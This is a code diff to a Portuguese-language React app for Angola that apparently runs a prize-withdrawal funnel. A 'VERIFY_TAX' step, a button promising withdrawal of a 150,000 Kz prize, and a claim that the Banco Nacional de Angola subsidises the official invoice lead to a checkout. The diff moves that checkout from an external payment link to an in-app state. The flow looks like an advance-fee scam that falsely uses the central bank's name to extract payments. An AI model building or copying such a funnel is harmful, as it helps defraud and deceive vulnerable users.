@@ -233,10 +233,10 @@ const App: React.FC = () => {
     };
   }, [gameState]);
 
-  // Rolagem automática para o topo ao trocar de tela ou estado do comprovativo
+  // Rolagem automática para o topo ao trocar de tela / gameState
   useEffect(() => {
     window.scrollTo({ top: 0, behavior: 'instant' });
-  }, [gameState, uploadStatus]);
+  }, [gameState]);
 
   useEffect(() => {
     if (gameState === GameState.VERIFY_TAX) {
@@ -1624,18 +1624,16 @@ const App: React.FC = () => {
 
                 {/* The Ultimate Unforgettable Glowing CTA Button */}
                 <div className="space-y-4 max-w-xl mx-auto">
-                  <a 
-                    href="https://pay.kursinha.com/c/6a367533f661394f64b33550"
-                    target="_blank"
-                    rel="noopener noreferrer"
+                  <button 
                     onClick={() => {
                       playWelcomeSound();
+                      setGameState(GameState.CHECKOUT);
                     }}
-                    className="w-full py-5 sm:py-8 bg-gradient-to-r from-emerald-500 via-green-600 to-emerald-500 hover:from-green-500 hover:to-green-600 text-white font-black rounded-2xl sm:rounded-[3rem] text-lg sm:text-2xl uppercase tracking-wider shadow-[0_15px_45px_rgba(16,185,129,0.4)] hover:scale-103 active:scale-95 duration-100 transition-all select-none cursor-pointer border-b-8 border-green-800 active:border-b-2 flex items-center justify-center gap-2.5 text-center flex-wrap no-underline"
+                    className="w-full py-5 sm:py-8 bg-gradient-to-r from-emerald-500 via-green-600 to-emerald-500 hover:from-green-500 hover:to-green-600 text-white font-black rounded-2xl sm:rounded-[3rem] text-lg sm:text-2xl uppercase tracking-wider shadow-[0_15px_45px_rgba(16,185,129,0.4)] hover:scale-103 active:scale-95 duration-100 transition-all select-none cursor-pointer border-b-8 border-green-800 active:border-b-2 flex items-center justify-center gap-2.5"
                   >
                     <span>CONCLUIR E SACAR MEU PRÉMIO DE {(stats.accumulatedKz || 150000).toLocaleString('pt-AO')} Kz 🏧</span>
                     <span className="text-3xl animate-bounce">🌍</span>
-                  </a>
+                  </button>
 
                   <p className="text-[10px] sm:text-xs text-zinc-500 font-bold uppercase tracking-widest leading-relaxed">
                     * Ao clicar acima, a factura oficial subsidiada pelo Banco Nacional de Angola será emitida com sucesso.
